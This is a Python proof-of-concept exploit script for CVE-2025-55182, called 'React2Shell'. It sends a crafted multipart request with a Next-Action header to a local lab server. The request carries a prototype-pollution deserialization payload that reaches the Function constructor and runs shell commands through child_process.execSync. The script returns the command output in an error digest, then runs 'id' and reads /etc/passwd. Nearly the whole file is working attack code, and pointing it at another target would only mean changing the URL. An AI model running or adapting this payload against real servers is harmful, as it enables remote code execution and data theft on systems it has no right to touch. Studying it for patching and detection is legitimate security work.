#!/usr/bin/env python3
import requests
import sys

TARGET_URL = "http://localhost:3000"

def check_target():
    print("[*] Checking target accessibility...")
    try:
        resp = requests.get(TARGET_URL, timeout=5)
        print(f"[+] Target is UP (Status: {resp.status_code})")
        return True
    except Exception as e:
        print(f"[-] Target is DOWN: {e}")
        return False

def build_rce_payload(command):
    """
    Build exploit payload based on maple3142's PoC.
    Uses $@ deserialization to get Chunk reference and trigger RCE via Function constructor.
    """
    js_code = f"var res=process.mainModule.require('child_process').execSync('{command}',{{'timeout':5000}}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});"
    
    payload_json = f'{{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{{\\"then\\":\\"$B1337\\"}}","_response":{{"_prefix":"{js_code}","_chunks":"$Q2","_formData":{{"get":"$1:constructor:constructor"}}}}}}'
    
    return payload_json

def exploit(command):
    print(f"[*] Executing command: {command}")
    
    payload = build_rce_payload(command)
    
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    body = f"""------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
Content-Disposition: form-data; name="0"\r
\r
{payload}\r
------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
Content-Disposition: form-data; name="1"\r
\r
"$@0"\r
------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
Content-Disposition: form-data; name="2"\r
\r
[]\r
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--\r
"""
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Next-Action": "x",
        "Content-Type": f"multipart/form-data; boundary={boundary}",
    }
    
    try:
        resp = requests.post(TARGET_URL, headers=headers, data=body, timeout=10)
        print(f"[*] Response Status: {resp.status_code}")
        
        if resp.status_code in [303, 500]:
            text = resp.text
            if 'digest' in text:
                start = text.find('"digest":"') + len('"digest":"')
                end = text.find('"', start)
                if start > 0 and end > start:
                    result = text[start:end]
                    print(f"[+] Command output:\n{result}")
                    return result
        
        print(f"[-] Unexpected response: {resp.text[:500]}")
        return None
        
    except Exception as e:
        print(f"[-] Exploit failed: {e}")
        return None

def main():
    print("=" * 60)
    print("CVE-2025-55182 (React2Shell) - Remote Code Execution PoC")
    print("=" * 60)
    
    if not check_target():
        print("\n[-] Target not accessible. Start the container first:")
        print("    docker-compose up -d")
        sys.exit(1)
    
    print("\n[*] Test 1: Execute 'id' command")
    print("-" * 60)
    result = exploit("id")
    
    if result and "uid=" in result:
        print("\n" + "=" * 60)
        print("[+] SUCCESS! RCE vulnerability confirmed!")
        print("=" * 60)
        
        print("\n[*] Test 2: Read /etc/passwd")
        print("-" * 60)
        exploit("cat /etc/passwd | head -3")
        
        sys.exit(0)
    else:
        print("\n[-] Exploitation failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
